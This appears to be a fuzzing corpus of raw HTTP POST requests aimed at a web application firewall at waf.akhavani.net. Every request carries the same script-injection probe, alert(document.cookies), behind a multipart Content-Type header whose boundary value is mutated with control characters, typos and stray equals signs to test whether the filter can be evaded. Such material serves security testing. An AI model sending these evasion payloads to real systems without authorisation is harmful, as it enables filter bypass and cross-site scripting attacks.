POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 834\r\nContent-Type: multipart/form-data; ==boundaM?ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 898\r\nContent-Type: multipart/form-data; boundary=on\x0edary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 962\r\nContent-Type: multipart/form-data; boundary=Kboundar*;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 25\r\nContent-Type: multipart/form-data; boundarybound5ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 89\r\nContent-Type: multipart/form-data; boundary=boun\x11dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 153\r\nContent-Type: multipart/form-data; bound|arybouk\x07npdary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 217\r\nContent-Type: multipart/form-data; ===;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 281\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 345\r\nContent-Type: multipart/form-data; boun\x06ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 409\r\nContent-Type: multipart/form-data;  ondary=boG!daQy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 473\r\nContent-Type: multipart/form-data; boundrKZy==bounary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 537\r\nContent-Type: multipart/form-data; boundaryoundary\x1aboYud?ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 601\r\nContent-Type: multipart/form-data; boundUry=noundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 665\r\nContent-Type: multipart/form-data; bounaryboundary=boundarybondarybunar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 729\r\nContent-Type: multipart/form-data; boundarybmundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 793\r\nContent-Type: multipart/form-data; ==onYa.:;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 857\r\nContent-Type: multipart/form-data; )b`oundary==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 921\r\nContent-Type: multipart/form-data; boundaryboundary=boRundSary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 985\r\nContent-Type: multipart/form-data; Eounaryboundry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 27\r\nContent-Type: multipart/form-data; ==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 91\r\nContent-Type: multipart/form-data; boundary=bondary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 155\r\nContent-Type: multipart/form-data; \x00oundarybounda\x1a=bounFary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 219\r\nContent-Type: multipart/form-data; oufd[r=boundnar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 283\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 347\r\nContent-Type: multipart/form-data; oundaryboundary=boun\x11ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 411\r\nContent-Type: multipart/form-data; ^boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 475\r\nContent-Type: multipart/form-data; boundary=boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 539\r\nContent-Type: multipart/form-data; bundary=]oundarybundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 603\r\nContent-Type: multipart/form-data; boundary=^oundar\x01;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 667\r\nContent-Type: multipart/form-data; boundary=bounda-y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 731\r\nContent-Type: multipart/form-data; boundary=b\x7fundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 795\r\nContent-Type: multipart/form-data; bou\xc2\xabdaryboundaryboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 859\r\nContent-Type: multipart/form-data; ====;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 923\r\nContent-Type: multipart/form-data; =bou9ndar\x03;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 987\r\nContent-Type: multipart/form-data; boundary=\x13obunday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 13\r\nContent-Type: multipart/form-data; =boSundary=b\toudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 77\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 141\r\nContent-Type: multipart/form-data; boundryboundarhbnaryboun\xc2\xabary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 205\r\nContent-Type: multipart/form-data; bundaryboundarybondary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 269\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 333\r\nContent-Type: multipart/form-data; oupda\nybundarybounRda y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 397\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 461\r\nContent-Type: multipart/form-data; boudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 525\r\nContent-Type: multipart/form-data; boundaryboundaryVbIundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 589\r\nContent-Type: multipart/form-data; bounxary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 653\r\nContent-Type: multipart/form-data; bounda:ryboundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 717\r\nContent-Type: multipart/form-data; b\x02ounary=boudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 781\r\nContent-Type: multipart/form-data; bound ry=boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 845\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 909\r\nContent-Type: multipart/form-data; boundary=bou\x1e\xc2\xbbday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 973\r\nContent-Type: multipart/form-data; boundary=bounda;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
